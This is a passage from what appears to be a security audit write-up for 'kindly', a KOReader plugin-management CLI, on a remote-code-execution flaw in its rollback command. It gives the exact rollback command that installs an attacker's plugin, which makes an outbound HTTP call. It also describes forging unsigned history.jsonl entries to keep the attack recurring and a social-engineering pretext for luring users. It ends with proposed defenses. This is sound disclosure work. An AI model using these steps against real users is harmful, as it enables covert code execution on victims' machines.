`/tmp/kindly-s51-live/attacker-snapshot/plugins-patches.tar.gz`
containing a minimal `plugins/evil.koplugin/` with a marker-writer
+ outbound HTTP call. A single invocation:

```
kindly rollback /tmp/kindly-s51-live/attacker-snapshot \
    --mount /tmp/kindly-s51-live/fixture --no-safety-snapshot
```

reports `✓ restored 2 plugin/patch file(s)` — no warning, no
prompt. `ls koreader/plugins/evil.koplugin/` shows `_meta.lua` and
`main.lua` landed. KOReader-on-macOS launch → marker file written
at 2s + `GET /s51 HTTP/1.1 200` on the listener. End-to-end RCE
via `rollback` with zero flags needed (the `--no-safety-snapshot`
above was only to keep the harness clean; the attack works
identically with safety-snapshot enabled — it just leaves a
pre-rollback copy of the benign pre-state).

**Severity rating: high (RCE).** Same terminal impact as S44/S46/
S49. Social-engineering footprint is closest to S46: "run
`kindly rollback <path>` to undo your last import using this
known-good snapshot I sent you." Distinct from S44 in that this
does not require even a packaged tarball — the attacker just
tells the user to point rollback at a directory.

**History-entry forgery variant (noted, not exploited alone).**
`history/reader.ts:102-110` (`findHistoryEntryByIndex`) trusts
every line of `.kindly/history.jsonl` verbatim — no HMAC, no
signature. Any attacker who can write a single JSONL line there
(e.g., post S44/S46/S49 positioning) can plant a forged
`setup:import` entry whose `summary.pre_import_path` points at
an attacker-controlled directory *anywhere on the filesystem*.
A subsequent `kindly rollback --to <N>` — the primary
user-facing rollback path — then delivers the S51 primitive
with the victim never picking a path. This stacks on top of S51
as a post-compromise persistence / recurring-RCE mechanism.

**Defense (extends §8.7).** The rollback trust gate must cover
both entry points: (a) reject `snapshotDir` arguments that are
not under `<cwd>/.kindly/{pre-import,pre-apply,pre-rollback,
backups}/`, and (b) HMAC every `.kindly/history.jsonl` line
when written so forged lines fail the MAC check on read. Anchor
the HMAC to a machine-local key at `.kindly/.secrets/mac.key`
(mode 0600, created on first `kindly` invocation, never shipped
in snapshots). Same key protects the rollback/restore path-
anchor decision and the defense against S44/S46/S47/S49.

Harness: `/tmp/kindly-s51-live/run.sh`. Reproducible in ~5s on
macOS with the KOReader emulator.

---

